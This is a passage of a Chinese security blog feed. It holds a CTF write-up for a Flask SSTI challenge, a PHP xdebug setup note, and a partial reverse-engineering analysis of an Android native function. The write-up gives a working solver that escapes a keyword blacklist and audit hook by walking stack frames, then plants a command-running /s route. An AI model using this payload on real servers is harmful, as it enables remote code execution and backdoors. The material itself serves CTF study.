class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> ,</span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Isn&#x27;t that enough? Isn&#x27;t that enough.&quot;</span>]</span><br><span class="line"><span class="comment">#lock_within = [] 服务端代码禁用了mimetype</span></span><br><span class="line"></span><br><span class="line">allowed_endpoint = [<span class="string">&quot;static&quot;</span>, <span class="string">&quot;index&quot;</span>, <span class="string">&quot;r3al_ins1de_th0ught&quot;</span>]</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    quote = flask.request.args.get(<span class="string">&#x27;spell&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> quote:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> quote.startswith(<span class="string">&quot;fly-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> quote:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&#x27;------&#x27;</span>+i+<span class="string">&#x27;;;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;wouldn&#x27;t it be easier to give in?&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(flask.request.origin)</span><br><span class="line">                time.sleep(random.randint(<span class="number">10</span>, <span class="number">30</span>)/<span class="number">10</span>) <span class="comment"># No time based injections.</span></span><br><span class="line">                flask.render_template_string(<span class="string">&#x27;Let-the-magic-&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;quote&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Registered endpoints and functions:&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> endpoint, func <span class="keyword">in</span> app.view_functions.items():</span><br><span class="line">                    <span class="keyword">if</span> endpoint <span class="keyword">not</span> <span class="keyword">in</span> allowed_endpoint:</span><br><span class="line">                        <span class="keyword">del</span> func <span class="comment"># No creating backdoor functions &amp; endpoints.</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="string">f&#x27;What are you doing with <span class="subst">&#123;endpoint&#125;</span> hacker?&#x27;</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Let the true magic begin!&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><ul><li>使用now you see me 1的逃逸方法 修改allowed_endpoint</li><li>容器的的黑名单比本地多了&quot;mimetype&quot;,使用request.origin代替<br><a href="https://flask.palletsprojects.com/en/latest/api/#flask.Request">flask.request</a></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> requests.models <span class="keyword">import</span> PreparedRequest</span><br><span class="line">req = PreparedRequest()</span><br><span class="line"></span><br><span class="line">code_disable_limit = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dict.__delitem__(sys.modules,&#x27;os&#x27;)</span></span><br><span class="line"><span class="string">dict.__delitem__(sys.modules,&#x27;subprocess&#x27;)</span></span><br><span class="line"><span class="string">dict.__delitem__(sys.modules,&#x27;_posixsubprocess&#x27;)</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string">    g = f()</span></span><br><span class="line"><span class="string">    frame = next(g)</span></span><br><span class="line"><span class="string">    for i in range(7):</span></span><br><span class="line"><span class="string">        frame=frame.f_back</span></span><br><span class="line"><span class="string">        print(frame)</span></span><br><span class="line"><span class="string">    frame.f_globals[&#x27;allowed_endpoint&#x27;]=[&#x27;/s&#x27;]</span></span><br><span class="line"><span class="string">    frame.f_globals[&#x27;counter&#x27;]=-100</span></span><br><span class="line"><span class="string">    return 0</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">code_core=<span class="string">&quot;&quot;&quot;[ __import__(&#x27;time&#x27;).sleep(1) for flask in [__import__(&quot;flask&quot;)] for app in __import__(&quot;gc&quot;).get_objects() if type(app) == flask.Flask for jinja_globals in [app.jinja_env.globals] for c4tchm3 in [ lambda : __import__(&#x27;os&#x27;).popen(jinja_globals[&quot;request&quot;].args.get(&quot;cmd&quot;, &quot;id&quot;)).read() ] if [ app.__dict__.update(&#123;&#x27;_got_first_request&#x27;:False&#125;), app.add_url_rule(&quot;/s&quot;, endpoint=&quot;/s&quot;, view_func=c4tchm3) ] ]&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code=code_disable_limit+<span class="string">&#x27;\n&#x27;</span>+code_core</span><br><span class="line"></span><br><span class="line">base_url=<span class="string">f&quot;http://8080-0900f458-198a-4f7d-8f12-17b1b303a8a0.challenge.ctfplus.cn/H3dden_route&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;fly-#&#125;&quot;</span>+<span class="string">&quot;&quot;&quot;\</span></span><br><span class="line"><span class="string">&#123;%set\tcl,bt,ex,im,fl,rq,ag,cd=request.origin.split()%&#125;\</span></span><br><span class="line"><span class="string">&#123;%set\tbt=request|attr(cl)|attr(bt)%&#125;\</span></span><br><span class="line"><span class="string">&#123;%set\texe=bt.get(ex)%&#125;\</span></span><br><span class="line"><span class="string">&#123;%set\tcode=(request|attr(ag)).get(cd)%&#125;</span></span><br><span class="line"><span class="string">&#123;%print(exe(code))%&#125;&quot;&quot;&quot;</span>+<span class="string">&quot;&#123;#&quot;</span></span><br><span class="line"><span class="comment">#(request|attr(ag)).get(cd)括号少一对就报错</span></span><br><span class="line"><span class="comment">#服务端ban了mimetype,改用Origin</span></span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&quot;Origin&quot;</span>:<span class="string">&quot;&quot;&quot;close __builtins__ exec __import__ flask request args code&quot;&quot;&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">req.prepare_url(base_url, &#123;<span class="string">&quot;code&quot;</span>:code,<span class="string">&quot;spell&quot;</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line">res = requests.get(req.url,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h4 id="其他未解之谜"><a href="#其他未解之谜" class="headerlink" title="其他未解之谜"></a>其他未解之谜</h4><p>在终端中运行app.py就报错</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python app1.py </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/e/桌面/py/pyjali/SSTI/NUCM1/app1.py&quot;</span>, line <span class="number">100</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.11/subprocess.py&quot;</span>, line <span class="number">104</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> _posixsubprocess <span class="keyword">import</span> fork_exec <span class="keyword">as</span> _fork_exec</span><br><span class="line">ImportError: cannot <span class="keyword">import</span> name <span class="string">&#x27;fork_exec&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;_posixsubprocess&#x27;</span> (unknown location)   </span><br></pre></td></tr></table></figure><p>注释掉这些就能运行</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">    <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>即使在try里也会报错<br>并且code . 打开，在vscode里运行就是正常的<br>环境vmware17 kali2024.3和debian12</p>]]></content>
      
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> py </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php调试环境</title>
      <link href="/2025/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E9%85%8D%E7%BD%AEphp-debug/"/>
      <url>/2025/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E9%85%8D%E7%BD%AEphp-debug/</url>
      
        <content type="html"><![CDATA[<p>1<br> <span id="more"></span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install php php-xdebug</span><br><span class="line">vscode安装php-debug插件</span><br></pre></td></tr></table></figure><p>php&#x2F;8.x&#x2F;cli&#x2F;php.ini<br>php&#x2F;8.x&#x2F;apache2&#x2F;php.ini<br>添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">xdebug.mode=debug</span><br><span class="line">xdebug.start_with_request=yes</span><br></pre></td></tr></table></figure><p>此时可直接断点调试</p><h4 id="配合浏览器调试："><a href="#配合浏览器调试：" class="headerlink" title="配合浏览器调试："></a>配合浏览器调试：</h4><pre><code>- systemctl start apache2- 点击vscode 运行和调试按钮下的创建launc.json文件，运行即可</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>std::string的特征</title>
      <link href="/2025/05/10/%E5%AD%A6/encode/"/>
      <url>/2025/05/10/%E5%AD%A6/encode/</url>
      
        <content type="html"><![CDATA[<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3> <span id="more"></span><p>附件是坏的，不好动态调试</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Java_com_example_encode_MainActivity_nativeCheckFormat</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *str; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> lenn; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> *str_c_pile; <span class="comment">// r13</span></span><br><span class="line">  __int64 len_c_4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> c_dest; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v11; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 len_v13; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">char</span> *v17_RCX; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 dest_of_enc; <span class="comment">// [rsp+8h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> maybe_ret; <span class="comment">// [rsp+9h] [rbp-7Fh] BYREF</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+10h] [rbp-78h]</span></span><br><span class="line">  <span class="type">void</span> *v21; <span class="comment">// [rsp+18h] [rbp-70h]</span></span><br><span class="line">  _QWORD dest_short[<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *short_str_ptr; <span class="comment">// [rsp+30h] [rbp-58h]</span></span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+38h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 len_v15; <span class="comment">// [rsp+40h] [rbp-48h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+48h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v27; <span class="comment">// [rsp+50h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v27 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  str = (<span class="type">const</span> <span class="type">char</span> *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + <span class="number">1352LL</span>))(a1, a3, <span class="number">0</span>);</span><br><span class="line">  len = <span class="built_in">strlen</span>(str);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt;= <span class="number">0xFFFFFFFFFFFFFFF0LL</span> )</span><br><span class="line">    <span class="built_in">sub_21CE0</span>(&amp;dest);</span><br><span class="line">  lenn = len;</span><br><span class="line">  <span class="keyword">if</span> ( len &gt;= <span class="number">0x17</span> )                            <span class="comment">// 大于16，放到堆里</span></span><br><span class="line">  &#123;</span><br><span class="line">    len_c_4 = len | <span class="number">0xF</span>;                        <span class="comment">// 对齐 ???1111</span></span><br><span class="line">    str_c_pile = (<span class="type">char</span> *)<span class="keyword">operator</span> <span class="built_in">new</span>((len | <span class="number">0xF</span>) + <span class="number">1</span>);<span class="comment">// 堆</span></span><br><span class="line">    ptr = str_c_pile;                           <span class="comment">// 堆头存在ptr</span></span><br><span class="line">    dest = len_c_4 + <span class="number">2</span>;                         <span class="comment">// 使dest结尾是1</span></span><br><span class="line">                                                <span class="comment">// 要取len，只好从下面len_v15那个取</span></span><br><span class="line">    len_v15 = lenn;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;                                             <span class="comment">// else存到栈</span></span><br><span class="line">  <span class="built_in">LOBYTE</span>(dest) = <span class="number">2</span> * len;                       <span class="comment">// 就是len&lt;&lt;1</span></span><br><span class="line">  str_c_pile = (<span class="type">char</span> *)&amp;dest + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">LABEL_6:</span><br><span class="line">    <span class="built_in">memmove</span>(str_c_pile, str, lenn);</span><br><span class="line">  str_c_pile[lenn] = <span class="number">0</span>;</span><br><span class="line">  (*(<span class="built_in">void</span> (__fastcall **)(__int64, __int64, <span class="type">const</span> <span class="type">char</span> *))(*(_QWORD *)a1 + <span class="number">1360LL</span>))(a1, a3, str);</span><br><span class="line">  c_dest = dest;</span><br><span class="line">  <span class="keyword">if</span> ( (dest &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( len_v15 &lt; <span class="number">0xA</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)dest &gt;&gt; <span class="number">1</span> &lt; <span class="number">0xAuLL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;                              <span class="comment">// 防</span></span><br><span class="line">  &#125;</span><br><span class="line">  v10 = std::string::<span class="built_in">rfind</span>(&amp;dest, <span class="string">&#x27;_&#x27;</span>, <span class="number">-1</span>);</span><br><span class="line">  c_dest = dest;</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">-1</span> )                              <span class="comment">// 找到了_o</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (dest &amp; <span class="number">1</span>) != <span class="number">0</span> )                      <span class="comment">// 堆-&gt;dest &amp; 1) != 0</span></span><br><span class="line">      len_v13 = len_v15;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      len_v13 = (<span class="type">unsigned</span> __int8)dest &gt;&gt; <span class="number">1</span>;     <span class="comment">// v13就是len，存在栈里，dest是结尾是0，同时存储len*2</span></span><br><span class="line">    <span class="keyword">if</span> ( len_v13 &lt;= <span class="number">4</span> )</span><br><span class="line">      <span class="built_in">sub_21D60</span>(dest_short);</span><br><span class="line">    v14 = v10 - <span class="number">4</span>;                              <span class="comment">// ISCC&#123;&#125;</span></span><br><span class="line">    <span class="keyword">if</span> ( (dest &amp; <span class="number">1</span>) != <span class="number">0</span> )                      <span class="comment">// 堆</span></span><br><span class="line">      v15 = (<span class="type">char</span> *)ptr;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v15 = (<span class="type">char</span> *)&amp;dest + <span class="number">1</span>;                  <span class="comment">// 栈</span></span><br><span class="line">    v11 = len_v13 - <span class="number">5</span>;                          <span class="comment">// 没搞清楚，</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= v14 )</span><br><span class="line">      v11 = v14;                                <span class="comment">// 取小的</span></span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= <span class="number">0xFFFFFFFFFFFFFFF0LL</span> )</span><br><span class="line">      <span class="built_in">sub_21CE0</span>(dest_short);</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt;= <span class="number">0x17</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = (<span class="type">char</span> *)<span class="keyword">operator</span> <span class="built_in">new</span>((v11 | <span class="number">0xF</span>) + <span class="number">1</span>);</span><br><span class="line">      short_str_ptr = v16;</span><br><span class="line">      dest_short[<span class="number">0</span>] = ((v11 | <span class="number">0xF</span>) + <span class="number">1</span>) | <span class="number">1</span>;    <span class="comment">// 就是dest的结构</span></span><br><span class="line">      dest_short[<span class="number">1</span>] = v11;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">LOBYTE</span>(dest_short[<span class="number">0</span>]) = <span class="number">2</span> * v11;</span><br><span class="line">      v16 = (<span class="type">char</span> *)dest_short + <span class="number">1</span>;             <span class="comment">// 这里是union</span></span><br><span class="line">      <span class="keyword">if</span> ( !v11 )</span><br><span class="line">      &#123;</span><br><span class="line">loop____:</span><br><span class="line">        v16[v11] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">encode_front_part</span>(&amp;dest_of_enc);</span><br><span class="line">        <span class="keyword">if</span> ( (dest_of_enc &amp; <span class="number">1</span>) != <span class="number">0</span> )           <span class="comment">// 堆</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v20 != <span class="number">12</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( dest_of_enc &gt;&gt; <span class="number">1</span> != <span class="number">12</span> )      <span class="comment">// 截取的字符串长度不是12</span></span><br><span class="line">        &#123;</span><br><span class="line">LABEL_32:</span><br><span class="line">          <span class="built_in">LODWORD</span>(v11) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (dest_of_enc &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">LABEL_40:</span><br><span class="line">            <span class="keyword">if</span> ( (dest_short[<span class="number">0</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(short_str_ptr)</span></span>;</span><br><span class="line">            <span class="keyword">if</span> ( (dest &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">              <span class="keyword">goto</span> neeed____;</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v11;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_39:</span><br><span class="line">          <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v21)</span></span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( (dest_of_enc &amp; <span class="number">1</span>) != <span class="number">0</span> )           <span class="comment">// 是栈，那么判断v21就是返回值</span></span><br><span class="line">          v17_RCX = (<span class="type">char</span> *)v21;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v17_RCX = &amp;maybe_ret;</span><br><span class="line">        <span class="built_in">LOBYTE</span>(v11) = (*(_QWORD *)v17_RCX ^ <span class="string">&#x27;B5QWLxRf&#x27;</span> | *((<span class="type">unsigned</span> <span class="type">int</span> *)v17_RCX + <span class="number">2</span>) ^ (<span class="type">unsigned</span> __int64)<span class="string">&#x27;AAHH&#x27;</span>) == <span class="number">0</span>;<span class="comment">// 好像是大端序</span></span><br><span class="line">                                                <span class="comment">// 48 48 41 41 -&gt; HHAA</span></span><br><span class="line">        <span class="keyword">if</span> ( (dest_of_enc &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_40;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memmove</span>(v16, v15 + <span class="number">5</span>, v11);</span><br><span class="line">    <span class="keyword">goto</span> loop____;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_12:</span><br><span class="line">  <span class="built_in">LODWORD</span>(v11) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (c_dest &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">neeed____:                                      <span class="comment">// 要返回真，必须跳13</span></span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span 